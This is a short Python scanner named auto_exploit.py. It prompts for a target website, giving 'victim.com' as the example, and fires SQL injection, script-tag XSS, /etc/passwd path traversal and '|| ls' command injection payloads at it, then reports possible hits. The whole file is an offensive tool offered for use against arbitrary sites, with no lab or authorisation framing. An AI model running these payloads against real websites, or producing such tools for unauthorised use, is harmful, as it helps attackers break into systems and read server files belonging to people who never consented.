# auto_exploit.py
import requests
import re
import settings

exploits = {
    "SQLi": "' OR '1'='1",
    "XSS": "<script>alert('MASAN')</script>",
    "LFI": "../../../../../../../../etc/passwd",
    "RCE": "|| ls",
}

def test_sqli(url):
    try:
        test_url = url + "?id=" + exploits["SQLi"]
        r = requests.get(test_url, timeout=settings.DEFAULT_TIMEOUT)
        if "mysql" in r.text.lower() or "syntax" in r.text.lower():
            print(f"{settings.COLOR_GREEN}[+] Possible SQL Injection: {test_url}{settings.COLOR_END}")
    except:
        pass

def test_xss(url):
    try:
        payload = exploits["XSS"]
        r = requests.get(url, params={"q": payload}, timeout=settings.DEFAULT_TIMEOUT)
        if payload in r.text:
            print(f"{settings.COLOR_GREEN}[+] Possible XSS: {url}{settings.COLOR_END}")
    except:
        pass

def test_lfi(url):
    try:
        lfi_payload = exploits["LFI"]
        r = requests.get(url + "?file=" + lfi_payload, timeout=settings.DEFAULT_TIMEOUT)
        if "root:x" in r.text:
            print(f"{settings.COLOR_GREEN}[+] Possible LFI: {url}{settings.COLOR_END}")
    except:
        pass

def test_rce(url):
    try:
        rce_payload = exploits["RCE"]
        r = requests.get(url + "?cmd=" + rce_payload, timeout=settings.DEFAULT_TIMEOUT)
        if "bin" in r.text:
            print(f"{settings.COLOR_GREEN}[+] Possible RCE: {url}{settings.COLOR_END}")
    except:
        pass

def auto_exploit(target):
    print(f"{settings.COLOR_CYAN}[~] Auto-exploiting {target}...{settings.COLOR_END}")
    test_sqli(target)
    test_xss(target)
    test_lfi(target)
    test_rce(target)

def start_auto_exploit():
    target = input("Target website (example: https://victim.com/index.php): ").strip()
    auto_exploit(target)

if __name__ == "__main__":
    start_auto_exploit()
